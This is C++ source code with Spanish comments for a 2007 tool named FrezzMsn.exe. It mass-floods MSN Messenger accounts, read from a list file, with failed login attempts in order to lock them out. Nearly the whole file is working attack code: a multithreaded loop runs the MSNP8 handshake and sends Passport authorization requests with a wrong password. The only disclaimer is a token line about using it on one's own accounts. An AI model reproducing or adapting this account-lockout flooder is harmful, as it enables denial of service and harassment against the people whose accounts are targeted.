/*
Projecto: FrezzMsn.exe
Fecha Inicio: 16/04/2007
Fecha Fin: 25/04/2007
Fecha Ultima modificacion: 26/04/2007
Creador: Evilgoblin
http://www.fotolog.com/evilgoblin

Proceso:
        Inentar Masivamente Conexiones
        a MSN con cualquier contraseña
        con el objetivo de inutilizar
        la cuenta,
        las cuentas las capta de un
        archivo ListaMsn.txt
        que debe estar en la misma
        carpeta del Ejecutable.

NO ME HAGO RESPONSABLE POR EL MAL
USO QUE LE DEN, SOLO ES PARA UTILIZAR
CON CUENTAS DE USTEDES o DE GENTE
CON SU CONSENTIMIENTO.

Debido a que el codigo es cacero
Y por un 1d10t que nu estudio 
programacion ^^ puede contener
varios errores, como la comprobacion
de que realmente funcione
ya que =P cuesta mucho tiempo
y 0 ganas de hacerlo ^^
*/

//DICTAMOS LOS HEADERS .... ARCHIVOS DE CABECERAS.......
#include <iostream>
#include <cstdlib>
#include <winsock2.h>
#include <wininet.h>
#include <cstring>
#include <fstream>
using namespace std;
////FUNCIONES///////
void InicioRed();
void FinRed();
void cargar();

///VARIABLES GLOBALES
int port = 1863;
char mail[100][50];
int CantMail =0;
int a = 0;
char passwd[] = {"NoseNose"};
//////////////////


//////HILO////////////////
DWORD WINAPI ThFunc(LPVOID a)
{
       char Peticio[1448];
           int prueba =0;    
    struct sockaddr_in estructura;
    struct sockaddr_in estructura2;         
    char buffer[800];
    char enviar[500];
    char aux[200];
    char dato[500];
    buffer[0]='\0';
    enviar[0]='\0';
    int conexion1;
    int conexion2;
    char ip[30];
    ip[0]='\0';
       char Aux[35];
   char mimail[40];
     char Agent[]="BJFMD";
 while(1<5)
 {   
    
  for(int numero=0;numero<CantMail;numero++)
 {  
 Sleep(50);
       dato[0]='\0';
    buffer[0]='\0';
    enviar[0]='\0'; 
    aux[0]='\0';
    ip[0]='\0';
    Sleep(100);
    /////CONECTAMOS PRIMER SERVIDOR   
   estructura.sin_family = AF_INET;
   estructura.sin_port = htons(port);
   estructura.sin_addr.s_addr = inet_addr("65.54.239.80");
   conexion1 = socket(AF_INET,SOCK_STREAM,0);
          if (connect(conexion1,(struct sockaddr *) &estructura, sizeof(estructura)) < 0) 
          {
        
        }
        else
        {
          
          
    ///ENVIAMOS PRIMER MENSAJE      
     strcat(enviar,"VER 1 MSNP8 CVR0\r\n");
     send(conexion1,enviar,strlen(enviar),0);            
    prueba = recv(conexion1, buffer, sizeof(buffer), 0); 
    
     if(!prueba)
     {
    }
    else    
    {
     ///ENVIAMOS SEGUNDO MENSAJE
     enviar[0] ='\0';
     strcat(enviar, "CVR 2 0x0409 win 4.10 i386 MSNMSGR 5.0.0544 MSMSGS ");     
	strcat(enviar,mail[numero]);
	strcat(enviar,"\r\n"); 

    send(conexion1,enviar,strlen(enviar),0);
    buffer[0]='\0';
    prueba =0;
    prueba = recv(conexion1, buffer, sizeof(buffer), 0); 
    Sleep(200);
    if (!prueba)
    {
}
else
{
  
   ////ENVIAMOS TERCER MENSAJE
     enviar[0] ='\0';
    strcat(enviar, "USR 3 TWN I ");
    strcat(enviar,mail[numero]);
    	strcat(enviar,"\r\n");
       send(conexion1,enviar,sizeof(enviar),0);
    buffer[0]='\0';
    prueba = recv(conexion1, buffer, sizeof(buffer), 0);  
    if (!prueba)
    {
    }
    else
    {
   aux[0]='\0';
   for(int i=9;i<50;i++)
   {
    char parcial[2];
    parcial[0] ='\0';
    sprintf(parcial,"%c",buffer[i]);
    strcat(ip,parcial);
   }
   strtok(ip,":");
   closesocket (conexion1);
   

  //conexion 2 
      memset(&estructura2,0,sizeof(estructura2));
   estructura2.sin_family = AF_INET;
   estructura2.sin_port = htons(port);
   estructura2.sin_addr.s_addr = inet_addr(ip);
   conexion1 = socket(AF_INET,SOCK_STREAM,0);
          if (connect(conexion1,(struct sockaddr *) &estructura2, sizeof(estructura)) < 0) 
          {
         
            }
            else
            {
           
  /////////////
  ////////////   
    

        enviar[0]='\0';
      strcat(enviar,"VER 1 MSNP8 CVR0\r\n");
     send(conexion1,enviar,strlen(enviar),0);            
        buffer[0]='\0';
     prueba = recv(conexion1, buffer, sizeof(buffer), 0); 
         if (!prueba)
    {
          closesocket (conexion1);
}
else
{
 /////////2do paso
 
 	enviar[0] = '\0';
	strcat(enviar,"CVR 2 0x0409 win 4.10 i386 MSNMSGR 5.0.0544 MSMSGS ");
	strcat(enviar,mail[numero]);
	strcat(enviar,"\r\n");
     send(conexion1,enviar,strlen(enviar),0);            
        buffer[0]='\0';
    prueba = recv(conexion1, buffer, sizeof(buffer), 0); 	

        if (!prueba)
    {
      
         closesocket (conexion1);
}
else
{
    /////PASO 3
	enviar[0] = '\000';
	strcat(enviar,"USR 3 TWN I ");
	strcat(enviar,mail[numero]);
	strcat(enviar,"\r\n");

     send(conexion1,enviar,strlen(enviar),0);            
        buffer[0]='\0';
     prueba = recv(conexion1, buffer, 161, 0);     


       if (!prueba)
    {
        
           closesocket (conexion1);
}
else
{
     ////PASO 4  BUSCAMOS EL TIKET
 
     dato[0]='\0';
       
   for(int i=12;i<159;i++)
   {
      char temporal[2];
      temporal[0] = '\0';
      sprintf(temporal,"%c",buffer[i]);
      strcat(dato, temporal);

   }  


   ///////PASO 5

	
      HINTERNET Hroot;
   HINTERNET hOpen;

 
   DWORD tam;
  

 Peticio[0]='\0';

   sprintf(Peticio,"Authorization: Passport1.4 OrgVerb=GET,OrgURL=http%%3A%%2F%%2Fmessenger%%2Emsn%%2Ecom,sign-in=%s,pwd=%s,%s\r\n",
    mail[numero],passwd,dato);


   Hroot=InternetOpen(Agent,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
      if (Hroot==NULL)
      { 
        
          closesocket (conexion1);
         }
      else
      {  
      


   hOpen=InternetOpenUrl(Hroot,"https://login.passport.com/login2.srf",Peticio,-1, INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_SECURE,0);




   if (hOpen==NULL)
   {
      InternetCloseHandle(Hroot);
 
       closesocket (conexion1);
}
else
{   
   InternetCloseHandle(Hroot);
   InternetCloseHandle(hOpen); 
   closesocket (conexion1);
  
}}}}}
}}}
}   
}   
}    	
}
}

/////////////////FUNCION MAIN//////////
int main(int argc, char *argv[])
{
int MAX = 1;
 cargar();

   DWORD  dwThreadID[MAX];  
  HANDLE hThread[MAX];

for (int i=0;i<CantMail;i++)
{
cout << mail[i] << endl;
}
cout << endl << "Cuantos hilos quieres crear: ";
cin >> MAX;
InicioRed();    
cout << "Flood Velocidad " << MAX << " iniciada..." << endl;
for(int i = 0;i<MAX;i++)
{
        Sleep(100);
 hThread[i] = CreateThread(NULL,0,ThFunc,&a,0,&dwThreadID[i]); 

}
WaitForMultipleObjects (MAX,hThread,TRUE,INFINITE);  

  cout << "SALIMOS !!!!!!!!!!!!!!!!!!!!!!" << endl; 
    FinRed();
    system("PAUSE");
    return EXIT_SUCCESS;
}

////////////////////FUNCIONES
void cargar()//cargar lista de contraseñas
{
     mail[0][0] = '\0';
     int i = 0;     
         ifstream fe("ListaMsn.txt");

         while(!fe.eof()) 
         { 
           fe >> mail[i]; 
           i++;
         }
     CantMail = i;
}
void InicioRed()//Inicializacion de la libreria de windows 
{

 WSADATA info;
 if (WSAStartup(MAKEWORD(2,0), &info) != 0)
 {
    printf("[-]Imposible iniciar Winsock!");
    return;
 }
}

void FinRed()
{
     WSACleanup();//Cerramos la libreria de forma correcta 
}
